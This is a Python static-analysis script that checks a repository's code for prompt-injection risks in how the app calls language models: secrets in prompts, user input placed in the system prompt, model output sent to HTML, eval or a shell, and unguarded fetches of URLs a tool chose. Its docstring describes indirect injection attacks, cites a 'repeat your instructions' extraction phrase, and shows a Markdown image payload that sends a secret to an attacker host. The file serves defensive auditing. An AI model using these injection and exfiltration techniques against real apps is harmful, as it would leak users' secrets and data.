#!/usr/bin/env python3
"""check_ai.py - static checks on how an app feeds and trusts a language model.

  check_ai.py REPO

A model reads everything it is given as possible instructions, so any text a
stranger controls (a request body, a fetched page, an uploaded file, a tool
result) can steer it. These checks look for the places where that steering
turns into damage. Each one names file:line; test files are excluded.

  ai.none                 no model call found (PASS, with the file count read)
  ai.client-key           a model API called from browser code
                          (dangerouslyAllowBrowser, a NEXT_PUBLIC_/VITE_ model
                          key, or a provider URL fetched from a client file):
                          the key ships to every visitor. FAIL critical.
  ai.prompt.system-input  request input interpolated into the SYSTEM prompt or
                          a system-role message. User input belongs in a user
                          message; in the system slot it outranks your own
                          instructions. FAIL high.
  ai.prompt.secret        an environment secret (a name with KEY, SECRET, TOKEN,
                          PASSWORD) placed inside prompt text: one "repeat your
                          instructions" and it is printed. FAIL high.
  ai.output.html          model output written as raw HTML (innerHTML,
                          dangerouslySetInnerHTML, v-html, c.html, res.send of
                          the text) with no sanitizer in that file. A prompt
                          injection becomes stored or reflected XSS. FAIL high.
  ai.output.exec          model output passed to eval, new Function, a shell
                          (exec, execSync, spawn with shell), or SQL built by
                          string. FAIL critical.
  ai.output.markdown      model output rendered as Markdown with images or links
                          left on (react-markdown, marked, markdown-it with no
                          image/url restriction). A component under a chat,
                          assistant or answer path counts as rendering the
                          model whatever its prop is named. An injected
                          ![](https://attacker/?q=<secret>) leaks data the
                          moment it renders. FAIL medium.
  ai.tools.fetch          a tool or function-calling handler fetches a URL the
                          model chose (input.url, args.url) with no allowlist or
                          safe fetch. Indirect injection turns it into SSRF and
                          exfiltration. FAIL high.

A PASS means the pattern was not found in the code read, not that the app is
injection-proof: prove that with ai-redteam against a local dev server.
"""
import os
import re
import sys

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import _corepath  # noqa: F401,E402
import ledger  # noqa: E402
import surface  # noqa: E402
import walk  # noqa: E402
from ledger import result  # noqa: E402

MODEL_HOSTS = {h for h, n in surface.PAID_HOSTS.items() if n in {"Anthropic", "OpenAI", "Google Gemini", "Google Vertex", "Perplexity", "OpenRouter"}}
MODEL_SDKS = {"@anthropic-ai/sdk", "openai", "@google/generative-ai", "@google/genai", "ai", "@ai-sdk/anthropic", "@ai-sdk/openai",
              "anthropic", "langchain", "@langchain/core", "@langchain/anthropic", "@langchain/openai", "ollama"}
MODEL_CALL = re.compile(
    r"\.(?:messages|completions|responses)\.(?:create|stream)\s*\(|\.chat\.completions\.create\s*\(|generateContent(?:Stream)?\s*\(|"
    r"\b(?:generateText|streamText|generateObject|streamObject)\s*\(|\benv\.AI\.run\s*\(|\.invoke\s*\(\s*\[|"
    r"https?://(?:" + "|".join(re.escape(h) for h in sorted(MODEL_HOSTS)) + r")")
SYSTEM_SLOT = re.compile(r"""\bsystem(?:Prompt|_prompt|Instruction|_instruction|Message)?\s*[:=]\s*(`[^`]{0,4000}`|'[^'\n]{0,600}'\s*\+[^,\n}]{1,300}|"[^"\n]{0,600}"\s*\+[^,\n}]{1,300}|f"[^"\n]{0,600}"|[\w$.]+\s*\+[^,\n}]{1,300})|"""
                         r"""role\s*:\s*['"]system['"]\s*,\s*content\s*:\s*(`[^`]{0,4000}`|['"][^'"\n]{0,600}['"]\s*\+[^,\n}]{1,300}|[\w$.]+\s*\+[^,\n}]{1,300})|"""
                         r"""content\s*:\s*(`[^`]{0,4000}`|['"][^'"\n]{0,600}['"]\s*\+[^,\n}]{1,300})\s*,\s*role\s*:\s*['"]system['"]""", re.S)
SYSTEM_IDENT = re.compile(r"""\bsystem(?:Prompt|_prompt)?\s*:\s*([A-Za-z_$][\w$]*)\s*[,}]""")
SECRET_NAME = r"[A-Z0-9_]*(?:KEY|SECRET|TOKEN|PASSWORD|PASSWD|CREDENTIAL)[A-Z0-9_]*"
SECRET_REF = re.compile(r"(?:process\.env|env|c\.env|import\.meta\.env|os\.environ(?:\.get\()?\[?['\"]?)\.?(" + SECRET_NAME + r")\b")
PROMPT_SLOT = re.compile(r"""\b(?:system(?:Prompt|_prompt)?|prompt|content|instructions?|messages?)\s*[:=]\s*(`[^`]{0,4000}`|f"[^"\n]{0,800}"|['"][^'"\n]{0,600}['"]\s*\+[^,\n}]{1,300})""", re.S)
OUT_NAME = re.compile(r"\b(?:\w*(?:completion|reply|answer|generated|aiText|aiHtml|llm\w*|modelOutput|assistant\w*|summary|narration|response(?:Text|Html)?|output(?:Text|Html)?)\w*)\b", re.I)
OUT_EXPR = re.compile(r"\.content\[0\]\.text|\.choices\[0\]\.message\.content|\.response\.text\(\)|\.output_text\b|\bresult\.text\b|\(await\s+\w+\.text\(\)\)")
HTML_SINK = re.compile(r"\.innerHTML\s*[+]?=\s*([^;\n]{1,240})|\.outerHTML\s*=\s*([^;\n]{1,240})|insertAdjacentHTML\([^,]+,\s*([^)\n]{1,240})|"
                       r"dangerouslySetInnerHTML=\{\{\s*__html\s*:\s*([^}\n]{1,240})\}\}|\bv-html=\"([^\"]{1,200})\"|\bc\.html\(\s*([^)\n]{1,240})|\bres\.send\(\s*([^)\n]{1,240})|\{@html\s+([^}\n]{1,200})\}")
SANITIZER = re.compile(r"DOMPurify|sanitize(?:Html)?\s*\(|sanitize-html|xss\(|escapeHtml\(|he\.encode\(|bleach\.clean|rehype-sanitize|isomorphic-dompurify", re.I)
EXEC_SINK = re.compile(r"\b(?:eval|new\s+Function|execSync|exec|spawnSync|spawn|execFile)\s*\(\s*([^;\n]{1,240})|\bsubprocess\.\w+\(\s*([^\n]{1,240})|\bos\.system\(\s*([^\n]{1,240})|"
                       r"\.(?:prepare|query|execute|run|\$queryRawUnsafe|\$executeRawUnsafe|raw)\(\s*(`[^`]*\$\{[^`]*`|['\"][^'\"\n]*['\"]\s*\+[^)\n]{1,200}|f\"[^\"\n]*\{[^\"\n]*\")")
MD_RENDER = re.compile(r"<(?:ReactMarkdown|Markdown)\b[^>]{0,400}>|\bmarked(?:\.parse)?\(\s*([^)\n]{1,200})\)|\bmd\.render\(\s*([^)\n]{1,200})\)|markdownit\(|new\s+MarkdownIt\(")
MD_SAFE = re.compile(r"disallowedElements|allowedElements|urlTransform|transformImageUri|transformLinkUri|skipHtml[^\n]{0,40}\bimg\b|rehype-sanitize|DOMPurify|"
                     r"renderer\.image\s*=|renderer\s*:\s*\{[^}]*image|md\.disable\(\s*\[?['\"](?:image|link)", re.I)
TOOL_DEF = re.compile(r"\btools\s*:\s*\[|\btool\s*\(\s*\{|server\.(?:tool|registerTool)\s*\(|\btool_use\b|\btool_calls\b|function_call|inputSchema|input_schema|parameters\s*:\s*z\.object|@tool\b")
TOOL_URL_FETCH = re.compile(r"""\b(?:fetch|axios(?:\.\w+)?|got|ky|undici\.request|requests\.\w+|httpx\.\w+)\(\s*(?:new\s+URL\()?\s*((?:input|args|params|toolInput|tool_input|arguments|block\.input|call\.input|parsed|a)\??\.\w*(?:url|href|link|endpoint|target|uri)\w*|(?:url|href|link|target)\b)""", re.I)
URL_GUARD = re.compile(r"safeFetch|isAllowedUrl|ALLOWED_HOSTS|allowedHosts|ALLOWLIST|allowlist|hostAllow|assertPublic|isPublicUrl|ssrf", re.I)
CHAT_PATH = re.compile(r"(?:^|/)[\w-]*(?:chat|assistant|copilot|bot|answer|reply|conversation|thread)[\w-]*(?:/|\.)", re.I)
CLIENT_PATH = re.compile(r"(?:^|/)(?:public|static|client|frontend|web|app)/|\.(?:tsx|jsx|vue|svelte)$|(?:^|/)src/(?:components|pages|routes|hooks|ui)/")
SERVER_HINT = re.compile(r"""['"]use server['"]|(?:^|/)(?:api|server|worker|functions)/|/route\.(?:ts|js)$|(?:^|/)app/.*/actions?\.(?:ts|js)$""")


def _mentions(expr, names):
    return any(re.search(r"(?<![\w$.])%s\b" % re.escape(n), expr) for n in names)


def _interpolated(expr):
    """The parts of a prompt value that are code, not literal text."""
    parts = re.findall(r"\$\{([^}]{1,200})\}", expr) + re.findall(r"(?<!\{)\{([^{}]{1,120})\}", expr if expr.startswith('f"') else "")
    if not expr.startswith(("`", 'f"')):
        parts.append(re.sub(r"(['\"])(?:\\.|(?!\1).)*\1", "", expr))
    return " ".join(parts)


def _model_files(repo):
    deps = set()
    for pkg in walk.all_package_jsons(repo):
        deps |= set(walk.deps(pkg))
    out = []
    for p in walk.files(repo, tests=False):
        t = walk.read_code(p)
        imports_sdk = re.search(r"""(?:from|require\()\s*['"](%s)['"]""" % "|".join(re.escape(s) for s in MODEL_SDKS), t) or re.search(r"^\s*(?:import|from)\s+(?:anthropic|openai|langchain)\b", t, re.M)
        if MODEL_CALL.search(t) or imports_sdk:
            out.append(p)
    return out, deps


def main():
    repo = os.path.abspath(sys.argv[1])
    res = []
    every = list(walk.files(repo, tests=False))
    mfiles, deps = _model_files(repo)
    if not mfiles and not (MODEL_SDKS & deps):
        return ledger.emit([result("ai.none", "Model calls in the code", "PASS", "%d source files read; no model API host, SDK import or call found" % len(every))])

    client_key, sys_input, secret_prompt, html, execs, md, tool_fetch = [], [], [], [], [], [], []
    for p in every:
        t = walk.read_code(p)
        r = walk.rel(repo, p)
        is_client = bool(CLIENT_PATH.search(r)) and not SERVER_HINT.search(r) and not re.search(r"['\"]use server['\"]", t)
        for m in re.finditer(r"dangerouslyAllowBrowser\s*:\s*true|(?:NEXT_PUBLIC|VITE|PUBLIC|EXPO_PUBLIC|REACT_APP)_\w*(?:ANTHROPIC|OPENAI|GEMINI|CLAUDE|GPT|OPENROUTER|PERPLEXITY)\w*(?:KEY|TOKEN)\b", t):
            client_key.append("%s:%d" % (r, walk.line_of(t, m.start())))
        if is_client:
            for m in re.finditer(r"https?://(?:%s)" % "|".join(re.escape(h) for h in sorted(MODEL_HOSTS)), t):
                client_key.append("%s:%d" % (r, walk.line_of(t, m.start())))

        model_here = p in mfiles
        names = surface.request_names(t)
        if model_here:
            for m in SYSTEM_SLOT.finditer(t):
                expr = next(g for g in m.groups() if g)
                code = _interpolated(expr)
                if surface.CALLER_INPUT_RX.search(code) or _mentions(code, names):
                    sys_input.append("%s:%d" % (r, walk.line_of(t, m.start())))
            # system: systemText, where systemText was assembled a few lines earlier
            for m in SYSTEM_IDENT.finditer(t):
                ident = m.group(1)
                a = re.search(r"(?:const|let|var)\s+%s\s*(?::[^=\n]{0,80})?=\s*([^;\n]{1,600})" % re.escape(ident), t)
                if a and (surface.CALLER_INPUT_RX.search(_interpolated(a.group(1))) or _mentions(_interpolated(a.group(1)), names)):
                    sys_input.append("%s:%d" % (r, walk.line_of(t, m.start())))
            for m in PROMPT_SLOT.finditer(t):
                code = _interpolated(m.group(1))
                s = SECRET_REF.search(code)
                if s:
                    secret_prompt.append("%s:%d %s" % (r, walk.line_of(t, m.start()), s.group(1)))

        outs = set(n for n in re.findall(r"(?:const|let|var)\s+([\w$]+)\s*=\s*[^;\n]*(?:\.content\[0\]\.text|choices\[0\]\.message\.content|\.response\.text\(\)|output_text|await\s+(?:generateText|env\.AI\.run))", t))
        def from_model(expr, strict=False):
            # The repo calls a model (checked above), so a UI sink fed `reply`, `answer` or `summary`
            # is read as model output even in a component that only receives it as a prop.
            # strict (exec sinks): only in a file that calls the model or names its output; build
            # scripts exec an `output` variable all the time.
            if OUT_EXPR.search(expr) or _mentions(expr, outs):
                return True
            return bool(OUT_NAME.search(expr)) and (not strict or model_here)
        clean = set(re.findall(r"(?:const|let|var)\s+([\w$]+)\s*=\s*[^;\n]*(?:" + SANITIZER.pattern + r")", t, re.I))
        for m in HTML_SINK.finditer(t):
            expr = next(g for g in m.groups() if g)
            # judged per sink: a sanitizer on one innerHTML in the file says nothing about the next one
            if from_model(expr) and not SANITIZER.search(expr) and not _mentions(expr, clean):
                html.append("%s:%d" % (r, walk.line_of(t, m.start())))
        for m in EXEC_SINK.finditer(t):
            expr = next(g for g in m.groups() if g)
            if from_model(expr, strict=True):
                execs.append("%s:%d" % (r, walk.line_of(t, m.start())))
        if not MD_SAFE.search(t):
            for m in MD_RENDER.finditer(t):
                seg = t[m.start(): m.start() + 600]
                chat_ui = bool(CHAT_PATH.search(r))  # app/chat/Answer.tsx renders the model whatever the prop is called
                if from_model(seg) or ((model_here or chat_ui) and m.group(0).startswith(("<", "markdownit", "new"))):
                    md.append("%s:%d" % (r, walk.line_of(t, m.start())))
        if TOOL_DEF.search(t) and not URL_GUARD.search(t):
            for m in TOOL_URL_FETCH.finditer(t):
                tool_fetch.append("%s:%d" % (r, walk.line_of(t, m.start())))

    where = "%d file(s) call a model: %s" % (len(mfiles), ledger.join_hits([walk.rel(repo, p) for p in mfiles], 4, ", "))
    def add(cid, title, hits, sev, fix, ok):
        if hits:
            res.append(result(cid, title, "FAIL", ledger.join_hits(sorted(set(hits)), 6, ", "), severity=sev, fix=fix))
        else:
            res.append(result(cid, title, "PASS", ok + "; " + where))
    add("ai.client-key", "No model API key or call in browser code", client_key, "critical",
        "call the model from a server route only; a key in a browser bundle belongs to everyone who opens the page", "no browser-side model key or provider call")
    add("ai.prompt.system-input", "Caller input stays out of the system prompt", sys_input, "high",
        "keep the system prompt fixed text; pass caller input as a user message, fenced and labeled as data", "no request-derived value in a system slot")
    add("ai.prompt.secret", "No secret inside prompt text", secret_prompt, "high",
        "never put a key, token or password in a prompt; the model can be talked into repeating it", "no KEY/SECRET/TOKEN/PASSWORD env value interpolated into a prompt")
    add("ai.output.html", "Model output is sanitized before it becomes HTML", html, "high",
        "render model text as text, or pass it through DOMPurify (or sanitize-html on the server) before any innerHTML", "no raw-HTML sink fed model output without a sanitizer")
    add("ai.output.exec", "Model output never reaches eval, a shell or string-built SQL", execs, "critical",
        "treat model output as untrusted input: parse it into a fixed set of allowed actions, bind SQL parameters, never eval", "no eval/shell/raw-SQL sink fed model output")
    add("ai.output.markdown", "Rendered model Markdown cannot load attacker images or links", md, "medium",
        "restrict images and link targets (react-markdown disallowedElements=['img'] or a urlTransform allowlist; a marked image renderer that drops external URLs)", "no unrestricted Markdown render of model output")
    add("ai.tools.fetch", "Tools fetch only allowlisted URLs", tool_fetch, "high",
        "route tool fetches through an allowlist or the outbound-fetch-guard safeFetch; never fetch a URL the model picked as-is", "no tool handler fetching a model-chosen URL without a guard")
    return ledger.emit(res)


if __name__ == "__main__":
    sys.exit(main())
